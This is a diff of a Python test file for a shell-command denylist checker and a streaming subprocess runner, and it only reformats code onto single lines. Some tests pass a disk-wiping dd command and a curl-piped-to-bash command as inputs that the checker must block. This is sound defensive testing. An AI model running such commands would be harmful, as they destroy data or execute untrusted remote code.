@@ -560,9 +560,7 @@ class TestCheckDenylistLegacy:
 
     def test_dd_to_device_blocked(self) -> None:
         """Should block dd to block devices."""
-        denied, reason, explanation = _check_denylist_legacy(
-            "dd if=/dev/zero of=/dev/sda"
-        )
+        denied, reason, explanation = _check_denylist_legacy("dd if=/dev/zero of=/dev/sda")
         assert denied is True
         assert reason == DenyReason.RAW_DISK_WRITE
 
@@ -574,9 +572,7 @@ class TestCheckDenylistLegacy:
 
     def test_pipe_to_shell_blocked(self) -> None:
         """Should block piping remote content to shell."""
-        denied, reason, explanation = _check_denylist_legacy(
-            "curl http://example.com/s.sh | bash"
-        )
+        denied, reason, explanation = _check_denylist_legacy("curl http://example.com/s.sh | bash")
         assert denied is True
         assert reason == DenyReason.PIPE_TO_SHELL
 
@@ -715,9 +711,7 @@ class TestStreamingEdgeCases:
         mock_process.poll = MagicMock(return_value=0)
         mock_process.stdout = MagicMock()
         mock_process.stderr = MagicMock()
-        mock_process.communicate = MagicMock(
-            side_effect=sp.TimeoutExpired("cmd", 1.0)
-        )
+        mock_process.communicate = MagicMock(side_effect=sp.TimeoutExpired("cmd", 1.0))
         mock_process.returncode = None
         mock_process.wait = MagicMock()
         mock_process.kill = MagicMock()
@@ -757,9 +751,7 @@ class TestStreamingEdgeCases:
 
         with patch("subprocess.Popen", return_value=mock_process):
             with patch("select.select", return_value=([None, mock_stdout], [], [])):
-                result = _run_streaming(
-                    "test", Path("/tmp"), 30.0, lambda l: captured.append(l), None
-                )
+                result = _run_streaming("test", Path("/tmp"), 30.0, lambda l: captured.append(l), None)
                 # Should complete without error, None stream is skipped
                 assert result.exit_code == 0
 
@@ -771,17 +763,13 @@ class TestStreamingEdgeCases:
         mock_process.poll = MagicMock(return_value=0)
         mock_process.stdout = MagicMock()
         mock_process.stderr = MagicMock()
-        mock_process.communicate = MagicMock(
-            return_value=("remaining_stdout\n", "remaining_stderr\n")
-        )
+        mock_process.communicate = MagicMock(return_value=("remaining_stdout\n", "remaining_stderr\n"))
         mock_process.returncode = 0
 
         captured: list[str] = []
 
         with patch("subprocess.Popen", return_value=mock_process):
-            result = _run_streaming(
-                "cmd", Path("/tmp"), 30.0, lambda l: captured.append(l), None
-            )
+            result = _run_streaming("cmd", Path("/tmp"), 30.0, lambda l: captured.append(l), None)
             assert "remaining_stdout" in result.stdout
             assert "remaining_stderr" in result.stderr
             # Both remaining outputs should have been passed to callback
